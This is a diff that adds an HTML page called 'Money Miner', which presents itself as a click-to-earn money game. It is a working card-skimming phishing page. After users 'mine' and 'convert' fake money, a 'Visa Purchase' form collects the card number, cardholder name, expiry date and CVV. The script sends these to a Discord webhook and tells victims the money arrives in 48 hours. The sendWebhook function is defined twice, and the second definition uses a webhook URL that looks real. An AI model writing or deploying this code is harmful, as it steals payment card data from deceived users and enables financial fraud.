@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Money Miner</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #6e45e2, #88d3ce);
+            color: white;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 30px;
+            background-color: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+        
+        h1 {
+            color: #ffffff;
+            font-size: 2.5rem;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .balance-display {
+            background: linear-gradient(45deg, #ff9a9e, #fad0c4);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .converted-display {
+            background: linear-gradient(45deg, #84fab0, #8fd3f4);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .balance-label, .converted-label {
+            font-size: 1.2rem;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        #balance, #converted-balance {
+            font-size: 3rem;
+            font-weight: bold;
+            color: #444;
+        }
+        
+        button {
+            background: linear-gradient(45deg, #6a11cb, #2575fc);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 12px 25px;
+            margin: 10px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        button:active {
+            transform: translateY(1px);
+        }
+        
+        #get-money {
+            background: linear-gradient(45deg, #11998e, #38ef7d);
+        }
+        
+        #convert-money {
+            background: linear-gradient(45deg, #f857a6, #ff5858);
+        }
+        
+        #visa-purchase {
+            background: linear-gradient(45deg, #4776E6, #8E54E9);
+            display: none;
+        }
+        
+        #card-form {
+            display: none;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            color: #333;
+            position: relative;
+        }
+        
+        #card-form h2 {
+            color: #444;
+            margin-bottom: 20px;
+        }
+        
+        #card-form input {
+            display: block;
+            width: 80%;
+            margin: 15px auto;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        
+        #card-form input:focus {
+            outline: none;
+            border-color: #6a11cb;
+            box-shadow: 0 0 0 2px rgba(106, 17, 203, 0.2);
+        }
+        
+        #submit-payment {
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            margin-top: 20px;
+        }
+        
+        #confirmation {
+            display: none;
+            background: linear-gradient(45deg, #43cea2, #185a9d);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .card-icons {
+            margin: 15px 0;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0;
+            margin: 0;
+            line-height: 1;
+            box-shadow: none;
+        }
+        
+        .close-btn:hover {
+            color: #f00;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .cash-out {
+            color: #2d3748;
+            font-weight: bold;
+            font-size: 1.2rem;
+            background-color: rgba(255, 255, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 8px;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>💰 Money Miner</h1>
+        
+        <div class="balance-display">
+            <div class="balance-label">Current Balance:</div>
+            <div id="balance">$0.00</div>
+        </div>
+        
+        <div class="converted-display">
+            <div class="converted-label">Converted Money <span class="cash-out">CASH OUT!</span></div>
+            <div id="converted-balance">$0.00</div>
+        </div>
+        
+        <div>
+            <button id="get-money">⛏️ Mine Money</button>
+            <button id="convert-money">💱 Convert Money</button>
+            <button id="visa-purchase">💳 Visa Purchase</button>
+        </div>
+
+        <div id="card-form">
+            <button class="close-btn" id="close-form">×</button>
+            <h2>Enter Card Details</h2>
+            <div class="card-icons">💳 💰 🔒</div>
+            <input type="text" id="card-number" placeholder="Card Number" maxlength="19">
+            <input type="text" id="card-holder" placeholder="Cardholder Name">
+            <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5">
+            <input type="text" id="cvv" placeholder="CVV" maxlength="4">
+            <button id="submit-payment">Process Payment</button>
+        </div>
+
+        <div id="confirmation"></div>
+    </div>
+
+    <script>
+        let balance = 0;
+        let convertedBalance = 0;
+        const balanceDisplay = document.getElementById("balance");
+        const convertedBalanceDisplay = document.getElementById("converted-balance");
+        const confirmationMessage = document.getElementById("confirmation");
+        const cardForm = document.getElementById("card-form");
+        const visaButton = document.getElementById("visa-purchase");
+
+        // Format currency function
+        function formatCurrency(amount) {
+            return "$" + amount.toFixed(2);
+        }
+
+        document.getElementById("get-money").addEventListener("click", () => {
+            balance += 0.03;
+            balanceDisplay.textContent = formatCurrency(balance);
+            showConfirmationWithFade("$0.03 mined and added to your balance!");
+        });
+
+        document.getElementById("convert-money").addEventListener("click", () => {
+            if (balance > 0) {
+                sendWebhook("Converted $" + balance.toFixed(2));
+                convertedBalance += balance;
+                balance = 0;
+                balanceDisplay.textContent = formatCurrency(balance);
+                convertedBalanceDisplay.textContent = formatCurrency(convertedBalance);
+                showConfirmationWithFade("Money converted successfully! Now you can proceed with Visa purchase.");
+                visaButton.style.display = "inline-block";  // Show Visa button after conversion
+            } else {
+                showConfirmationWithFade("You need money to convert!", "error");
+            }
+        });
+
+        visaButton.addEventListener("click", () => {
+            cardForm.style.display = "block";
+        });
+        
+        // Close button functionality
+        document.getElementById("close-form").addEventListener("click", () => {
+            cardForm.style.display = "none";
+        });
+
+document.getElementById("submit-payment").addEventListener("click", () => {
+    const cardNumber = document.getElementById("card-number").value;
+    const cardHolder = document.getElementById("card-holder").value;
+    const expiryDate = document.getElementById("expiry-date").value;
+    const cvv = document.getElementById("cvv").value;
+
+    if (cardNumber && cardHolder && expiryDate && cvv) {
+        const paymentData = {
+            content: `💳 Test payment submitted\nName: ${cardHolder}\nCard: ${cardNumber}\nExpiry: ${expiryDate}\nCVV: ${cvv}\nAmount: $${convertedBalance.toFixed(2)}`
+        };
+
+        console.log("Sending this to webhook:", paymentData); // for testing
+        sendWebhook(paymentData);
+
+        cardForm.style.display = "none";
+        showConfirmationWithFade("Money transferring in about 48 hours!");
+
+        convertedBalance = 0;
+        convertedBalanceDisplay.textContent = formatCurrency(convertedBalance);
+    } else {
+        showConfirmationWithFade("Please fill in all card details.", "error");
+    }
+});
+
+function sendWebhook(dataOrString) {
+    const payload = typeof dataOrString === "string"
+        ? { content: dataOrString }
+        : dataOrString;
+
+        fetch("https://discord.com/api/webhooks/123456789012345678/abcDefGhIjKlMnOpQrStUvWxYz", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (!response.ok) throw new Error("Webhook failed.");
+        console.log("Webhook sent!");
+    })
+    .catch(error => console.error("Error sending webhook:", error));
+}
+
+// Format credit card number with dashes
+document.getElementById("card-number").addEventListener("input", function(e) {
+    let value = e.target.value.replace(/\D/g, "");
+    if (value.length > 16) value = value.slice(0, 16);
+
+    let formattedValue = "";
+    for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) formattedValue += "-";
+        formattedValue += value[i];
+    }
+
+    e.target.value = formattedValue;
+});
+
+// Format expiry date as MM/YY
+document.getElementById("expiry-date").addEventListener("input", function(e) {
+    let value = e.target.value.replace(/\D/g, "");
+    if (value.length > 4) value = value.slice(0, 4);
+
+    if (value.length > 2) {
+        value = value.slice(0, 2) + "/" + value.slice(2);
+    }
+
+    e.target.value = value;
+});
+
+// Limit CVV to digits only
+document.getElementById("cvv").addEventListener("input", function(e) {
+    let value = e.target.value.replace(/\D/g, "");
+    e.target.value = value;
+});
+
+function showConfirmationWithFade(message, type = "success") {
+    confirmationMessage.textContent = message;
+    confirmationMessage.style.display = "block";
+
+    if (type === "error") {
+        confirmationMessage.style.background = "linear-gradient(45deg, #FF416C, #FF4B2B)";
+    } else {
+        confirmationMessage.style.background = "linear-gradient(45deg, #43cea2, #185a9d)";
+    }
+
+    confirmationMessage.style.animation = 'none';
+    void confirmationMessage.offsetWidth;
+    confirmationMessage.style.animation = 'fadeIn 0.5s ease-in-out';
+
+    if (type !== "error") {
+        setTimeout(() => {
+            confirmationMessage.style.display = "none";
+        }, 3000);
+    }
+}
+
+function sendWebhook(dataOrString) {
+    const payload = typeof dataOrString === "string"
+        ? { content: dataOrString }
+        : dataOrString;
+
+    fetch("https://discord.com/api/webhooks/1236535772153384991/9FMEuWo0KJ4aOwX1oP9hZ5pmYbw0xMdKcvPrtaG9SI4LagmHFEIesq2mkmEpI9a1C0LV", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (!response.ok) {
+            // Webhook failed - send error message
+            throw new Error("Webhook failed with status: " + response.status);
+        }
+        console.log("Webhook sent!");
+    })
+    .catch(error => {
+        console.error("Error sending webhook:", error);
+
+        // 🔁 Send error details to the webhook
+        fetch("https://discord.com/api/webhooks/1236535772153384991/9FMEuWo0KJ4aOwX1oP9hZ5pmYbw0xMdKcvPrtaG9SI4LagmHFEIesq2mkmEpI9a1C0LV", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: `⚠️ Webhook Error:\n\`\`\`${error.message}\`\`\``
+            })
+        });
+    });
+}
+
+    </script>
+</body>
+</html>
